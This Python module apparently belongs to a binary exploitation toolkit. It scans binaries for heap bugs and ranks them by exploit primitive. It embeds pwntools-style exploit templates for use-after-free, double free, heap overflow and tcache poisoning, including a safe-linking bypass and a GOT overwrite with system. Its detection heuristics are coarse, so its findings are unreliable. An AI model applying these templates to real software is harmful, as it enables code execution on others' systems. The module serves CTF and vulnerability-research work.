"""
Advanced heap vulnerability analysis module.

Provides detailed heap vulnerability detection including:
- Allocation site tracking
- Size mismatch detection
- Double-free path analysis
- Chunk corruption detection
- Tcache count analysis
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from enum import Enum, auto
import re

from supwngo.core.binary import Binary
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class HeapVulnType(Enum):
    """Types of heap vulnerabilities."""
    USE_AFTER_FREE = auto()
    DOUBLE_FREE = auto()
    HEAP_OVERFLOW = auto()
    HEAP_UNDERFLOW = auto()
    UNINITIALIZED_READ = auto()
    TYPE_CONFUSION = auto()
    SIZE_MISMATCH = auto()
    NULL_DEREFERENCE = auto()
    TCACHE_POISONING = auto()
    FASTBIN_DUP = auto()
    UNSORTED_BIN_ATTACK = auto()
    HOUSE_OF_FORCE = auto()
    ARBITRARY_FREE = auto()


class ExploitPrimitive(Enum):
    """Exploitation primitives available from heap vulns."""
    ARBITRARY_READ = auto()
    ARBITRARY_WRITE = auto()
    ARBITRARY_FREE = auto()
    ARBITRARY_ALLOC = auto()
    INFO_LEAK = auto()
    CODE_EXEC = auto()


@dataclass
class AllocationSite:
    """Represents a malloc/calloc/realloc call site."""
    address: int
    function: str
    alloc_func: str  # malloc, calloc, realloc
    size: Optional[int] = None  # Static size if known
    size_arg_reg: str = ""  # Register containing size
    is_user_controlled: bool = False
    associated_frees: List[int] = field(default_factory=list)


@dataclass
class FreeSite:
    """Represents a free call site."""
    address: int
    function: str
    ptr_arg_reg: str = ""
    associated_allocs: List[int] = field(default_factory=list)
    ptr_nulled_after: bool = False


@dataclass
class HeapVulnerability:
    """Detailed heap vulnerability information."""
    vuln_type: HeapVulnType
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    address: int
    function: str
    description: str
    alloc_site: Optional[AllocationSite] = None
    free_site: Optional[FreeSite] = None
    primitives: List[ExploitPrimitive] = field(default_factory=list)
    exploit_template: str = ""
    confidence: float = 0.5
    glibc_version_req: Optional[str] = None  # Min glibc version required


@dataclass
class HeapLayout:
    """Represents heap layout information."""
    allocations: List[AllocationSite] = field(default_factory=list)
    frees: List[FreeSite] = field(default_factory=list)
    chunk_sizes: List[int] = field(default_factory=list)
    tcache_bins: Dict[int, int] = field(default_factory=dict)  # size -> count


class AdvancedHeapAnalyzer:
    """
    Advanced heap vulnerability analyzer.

    Performs deep analysis of heap usage patterns to identify:
    - Complex UAF scenarios
    - Double-free vulnerabilities
    - Heap overflow/underflow
    - Type confusion opportunities
    """

    def __init__(self, binary: Binary):
        """
        Initialize heap analyzer.

        Args:
            binary: Binary instance to analyze
        """
        self.binary = binary
        self.alloc_sites: List[AllocationSite] = []
        self.free_sites: List[FreeSite] = []
        self.vulnerabilities: List[HeapVulnerability] = []
        self.heap_layout = HeapLayout()

    def analyze(self) -> List[HeapVulnerability]:
        """
        Perform comprehensive heap analysis.

        Returns:
            List of detected heap vulnerabilities
        """
        logger.info("Starting advanced heap analysis...")

        # Find all allocation/free sites
        self._find_allocation_sites()
        self._find_free_sites()

        # Link allocations to frees
        self._link_alloc_free()

        # Detect vulnerabilities
        self._detect_uaf()
        self._detect_double_free()
        self._detect_size_mismatch()
        self._detect_heap_overflow()
        self._detect_tcache_issues()

        logger.info(f"Found {len(self.vulnerabilities)} heap vulnerabilities")
        return self.vulnerabilities

    def _find_allocation_sites(self) -> None:
        """Find all heap allocation sites."""
        alloc_funcs = {
            'malloc': 0,  # Arg index for size
            'calloc': 1,  # Second arg is size per element
            'realloc': 1,  # Second arg is new size
            'aligned_alloc': 1,
            'memalign': 1,
            'pvalloc': 0,
            'valloc': 0,
        }

        try:
            import capstone
            cs = capstone.Cs(capstone.CS_ARCH_X86,
                           capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32)
            cs.detail = True

            # Argument registers for x64
            arg_regs_64 = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
            arg_regs_32 = []  # Stack-based for x86

            arg_regs = arg_regs_64 if self.binary.bits == 64 else arg_regs_32

            for func_name, sym in self.binary.symbols.items():
                addr = sym.address if hasattr(sym, 'address') else sym
                if not addr:
                    continue

                try:
                    data = self.binary.read(addr, 0x500)
                    instructions = list(cs.disasm(data, addr))

                    for i, insn in enumerate(instructions):
                        if insn.mnemonic == 'call':
                            # Check if calling allocation function
                            for alloc_func, size_arg_idx in alloc_funcs.items():
                                if alloc_func in self.binary.plt:
                                    plt_addr = self.binary.plt[alloc_func]
                                    if hex(plt_addr) in insn.op_str or str(plt_addr) in insn.op_str:
                                        # Found allocation
                                        site = AllocationSite(
                                            address=insn.address,
                                            function=func_name,
                                            alloc_func=alloc_func,
                                        )

                                        # Try to determine size
                                        if arg_regs and size_arg_idx < len(arg_regs):
                                            site.size_arg_reg = arg_regs[size_arg_idx]
                                            # Look backwards for size
                                            site.size = self._find_arg_value(
                                                instructions[:i], arg_regs[size_arg_idx]
                                            )

                                        self.alloc_sites.append(site)
                                        break

                except Exception as e:
                    logger.debug(f"Error analyzing {func_name}: {e}")
                    continue

        except Exception as e:
            logger.warning(f"Allocation site analysis failed: {e}")

    def _find_free_sites(self) -> None:
        """Find all free call sites."""
        try:
            import capstone
            cs = capstone.Cs(capstone.CS_ARCH_X86,
                           capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32)
            cs.detail = True

            if 'free' not in self.binary.plt:
                return

            free_plt = self.binary.plt['free']

            for func_name, sym in self.binary.symbols.items():
                addr = sym.address if hasattr(sym, 'address') else sym
                if not addr:
                    continue

                try:
                    data = self.binary.read(addr, 0x500)
                    instructions = list(cs.disasm(data, addr))

                    for i, insn in enumerate(instructions):
                        if insn.mnemonic == 'call':
                            if hex(free_plt) in insn.op_str or str(free_plt) in insn.op_str:
                                site = FreeSite(
                                    address=insn.address,
                                    function=func_name,
                                    ptr_arg_reg='rdi' if self.binary.bits == 64 else '',
                                )

                                # Check if pointer is nulled after free
                                site.ptr_nulled_after = self._check_ptr_nulled(
                                    instructions[i+1:i+5] if i+1 < len(instructions) else []
                                )

                                self.free_sites.append(site)

                except Exception as e:
                    logger.debug(f"Error analyzing frees in {func_name}: {e}")
                    continue

        except Exception as e:
            logger.warning(f"Free site analysis failed: {e}")

    def _find_arg_value(self, instructions: list, reg: str) -> Optional[int]:
        """Find the value loaded into a register before a call."""
        for insn in reversed(instructions[-10:]):
            if insn.mnemonic == 'mov':
                parts = insn.op_str.split(',')
                if len(parts) == 2:
                    dst = parts[0].strip()
                    src = parts[1].strip()
                    if dst == reg:
                        # Check if source is immediate
                        if src.startswith('0x') or src.lstrip('-').isdigit():
                            try:
                                return int(src, 0)
                            except ValueError:
                                pass
                        break
        return None

    def _check_ptr_nulled(self, instructions: list) -> bool:
        """Check if pointer is set to NULL after free."""
        for insn in instructions:
            if insn.mnemonic == 'mov':
                parts = insn.op_str.split(',')
                if len(parts) == 2:
                    src = parts[1].strip()
                    if src == '0' or src == '0x0':
                        return True
            if insn.mnemonic == 'xor':
                parts = insn.op_str.split(',')
                if len(parts) == 2 and parts[0].strip() == parts[1].strip():
                    return True
        return False

    def _link_alloc_free(self) -> None:
        """Link allocation sites to their corresponding free sites."""
        # Simple heuristic: link by function
        for alloc in self.alloc_sites:
            for free in self.free_sites:
                if alloc.function == free.function:
                    alloc.associated_frees.append(free.address)
                    free.associated_allocs.append(alloc.address)

    def _detect_uaf(self) -> None:
        """Detect use-after-free vulnerabilities."""
        for free in self.free_sites:
            if not free.ptr_nulled_after:
                # Potential UAF - pointer not nulled
                vuln = HeapVulnerability(
                    vuln_type=HeapVulnType.USE_AFTER_FREE,
                    severity="HIGH",
                    address=free.address,
                    function=free.function,
                    description="Pointer not nulled after free - potential UAF",
                    free_site=free,
                    primitives=[ExploitPrimitive.ARBITRARY_WRITE, ExploitPrimitive.CODE_EXEC],
                    confidence=0.6,
                    exploit_template=self._gen_uaf_template(),
                )
                self.vulnerabilities.append(vuln)

    def _detect_double_free(self) -> None:
        """Detect double-free vulnerabilities."""
        # Check for multiple frees in same function
        func_frees: Dict[str, List[FreeSite]] = {}
        for free in self.free_sites:
            if free.function not in func_frees:
                func_frees[free.function] = []
            func_frees[free.function].append(free)

        for func, frees in func_frees.items():
            if len(frees) >= 2:
                # Multiple frees - check if they could be same pointer
                vuln = HeapVulnerability(
                    vuln_type=HeapVulnType.DOUBLE_FREE,
                    severity="CRITICAL",
                    address=frees[0].address,
                    function=func,
                    description=f"Multiple free() calls in {func} - potential double-free",
                    primitives=[ExploitPrimitive.ARBITRARY_WRITE, ExploitPrimitive.ARBITRARY_ALLOC],
                    confidence=0.5,
                    exploit_template=self._gen_double_free_template(),
                )
                self.vulnerabilities.append(vuln)

    def _detect_size_mismatch(self) -> None:
        """Detect allocation size mismatches."""
        # Check for allocations with user-controlled sizes
        for alloc in self.alloc_sites:
            if alloc.size is None:
                # Size not constant - could be user controlled
                vuln = HeapVulnerability(
                    vuln_type=HeapVulnType.SIZE_MISMATCH,
                    severity="MEDIUM",
                    address=alloc.address,
                    function=alloc.function,
                    description=f"Non-constant allocation size in {alloc.alloc_func}() - potential integer overflow",
                    alloc_site=alloc,
                    primitives=[ExploitPrimitive.ARBITRARY_ALLOC],
                    confidence=0.4,
                )
                self.vulnerabilities.append(vuln)

    def _detect_heap_overflow(self) -> None:
        """Detect heap buffer overflow opportunities."""
        # Check for allocations followed by unbounded writes
        dangerous_write_funcs = ['strcpy', 'strcat', 'sprintf', 'gets', 'read', 'recv']

        try:
            import capstone
            cs = capstone.Cs(capstone.CS_ARCH_X86,
                           capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32)

            for alloc in self.alloc_sites:
                # Check for dangerous writes after allocation
                try:
                    data = self.binary.read(alloc.address, 0x100)
                    for insn in cs.disasm(data, alloc.address):
                        if insn.mnemonic == 'call':
                            for write_func in dangerous_write_funcs:
                                if write_func in self.binary.plt:
                                    if str(self.binary.plt[write_func]) in insn.op_str:
                                        vuln = HeapVulnerability(
                                            vuln_type=HeapVulnType.HEAP_OVERFLOW,
                                            severity="HIGH",
                                            address=insn.address,
                                            function=alloc.function,
                                            description=f"Heap allocation followed by {write_func}() - potential overflow",
                                            alloc_site=alloc,
                                            primitives=[ExploitPrimitive.ARBITRARY_WRITE],
                                            confidence=0.7,
                                            exploit_template=self._gen_heap_overflow_template(),
                                        )
                                        self.vulnerabilities.append(vuln)
                                        break
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"Heap overflow detection failed: {e}")

    def _detect_tcache_issues(self) -> None:
        """Detect tcache-specific vulnerabilities."""
        # Only relevant for glibc >= 2.26
        if not self.free_sites:
            return

        # Check for tcache poisoning opportunities
        for free in self.free_sites:
            if not free.ptr_nulled_after:
                # With tcache, UAF can lead to tcache poisoning
                vuln = HeapVulnerability(
                    vuln_type=HeapVulnType.TCACHE_POISONING,
                    severity="CRITICAL",
                    address=free.address,
                    function=free.function,
                    description="Tcache poisoning possible via UAF",
                    free_site=free,
                    primitives=[ExploitPrimitive.ARBITRARY_ALLOC, ExploitPrimitive.ARBITRARY_WRITE],
                    confidence=0.7,
                    glibc_version_req="2.26",
                    exploit_template=self._gen_tcache_poison_template(),
                )
                self.vulnerabilities.append(vuln)

    def _gen_uaf_template(self) -> str:
        """Generate UAF exploit template."""
        return '''
# UAF Exploit Template
from pwn import *

# 1. Allocate chunk
alloc(size, data)

# 2. Free chunk (pointer not nulled)
free(idx)

# 3. Allocate same-size chunk to reuse freed chunk
# For tcache: first 8 bytes become fd pointer
alloc(size, p64(target_addr))

# 4. Allocate again to get chunk at target_addr
alloc(size, b"")  # Pop from tcache
alloc(size, payload)  # This allocates at target_addr

# 5. Trigger use of corrupted data
'''

    def _gen_double_free_template(self) -> str:
        """Generate double-free exploit template."""
        return '''
# Double-Free Exploit Template (tcache)
from pwn import *

# For glibc >= 2.32, need to bypass tcache key
# Key is stored at chunk+0x8

# 1. Allocate chunk
alloc(0x20, b"A" * 0x20)  # idx 0

# 2. Free it
free(0)

# 3. Corrupt tcache key (if glibc >= 2.32)
# Need another UAF or overflow to corrupt key

# 4. Free again (double-free)
free(0)

# 5. Now tcache has: chunk -> chunk
# Allocate and overwrite fd
alloc(0x20, p64(target))

# 6. Two more allocations
alloc(0x20, b"B")  # Gets original chunk
alloc(0x20, payload)  # Gets chunk at target
'''

    def _gen_heap_overflow_template(self) -> str:
        """Generate heap overflow exploit template."""
        return '''
# Heap Overflow Exploit Template
from pwn import *

# 1. Create victim chunk after vulnerable chunk
alloc(0x20, b"A")  # Vulnerable chunk (idx 0)
alloc(0x20, b"B")  # Victim chunk (idx 1)

# 2. Overflow into victim chunk's metadata
overflow_payload = b"A" * 0x28  # Fill vulnerable chunk + prev_size
overflow_payload += p64(0x41)   # Fake size (modify as needed)
overflow_payload += p64(target) # Overwrite victim's fd

edit(0, overflow_payload)

# 3. Free victim to get corrupted chunk into tcache/fastbin
free(1)

# 4. Allocate to get arbitrary write
alloc(0x30, payload)
'''

    def _gen_tcache_poison_template(self) -> str:
        """Generate tcache poisoning template."""
        return '''
# Tcache Poisoning Template
from pwn import *

# For glibc >= 2.32, need safe-linking bypass:
# fd_stored = (chunk_addr >> 12) ^ target_addr

def mangle(heap_base, target):
    """Safe-linking mangle for glibc >= 2.32"""
    return (heap_base >> 12) ^ target

# 1. Leak heap address for safe-linking
heap_leak = leak_heap()
heap_base = heap_leak & ~0xfff

# 2. UAF to overwrite fd
alloc(0x20, b"A")
free(0)

# 3. Overwrite fd with mangled target
target = elf.got['free']  # Or __free_hook for older glibc
mangled = mangle(heap_base, target)
edit(0, p64(mangled))

# 4. Allocate twice to get chunk at target
alloc(0x20, b"B")  # Gets original
alloc(0x20, p64(system))  # Gets target, write system
'''

    def get_exploitable_vulns(self) -> List[HeapVulnerability]:
        """Get vulnerabilities with clear exploitation paths."""
        return [v for v in self.vulnerabilities
                if v.primitives and v.confidence >= 0.5]

    def suggest_technique(self) -> Optional[str]:
        """Suggest best exploitation technique based on vulnerabilities."""
        if not self.vulnerabilities:
            return None

        # Priority order
        for vuln_type in [HeapVulnType.TCACHE_POISONING, HeapVulnType.DOUBLE_FREE,
                         HeapVulnType.USE_AFTER_FREE, HeapVulnType.HEAP_OVERFLOW]:
            for vuln in self.vulnerabilities:
                if vuln.vuln_type == vuln_type:
                    return vuln_type.name

        return self.vulnerabilities[0].vuln_type.name if self.vulnerabilities else None

    def summary(self) -> str:
        """Get heap analysis summary."""
        lines = [
            "Advanced Heap Analysis Summary",
            "=" * 40,
            f"Allocation Sites: {len(self.alloc_sites)}",
            f"Free Sites: {len(self.free_sites)}",
            f"Vulnerabilities: {len(self.vulnerabilities)}",
            "",
        ]

        if self.vulnerabilities:
            lines.append("Detected Vulnerabilities:")
            for vuln in self.vulnerabilities:
                lines.append(f"  [{vuln.severity}] {vuln.vuln_type.name}")
                lines.append(f"      {vuln.description}")
                if vuln.primitives:
                    prims = ", ".join(p.name for p in vuln.primitives)
                    lines.append(f"      Primitives: {prims}")

        technique = self.suggest_technique()
        if technique:
            lines.append("")
            lines.append(f"Suggested Technique: {technique}")

        return "\n".join(lines)
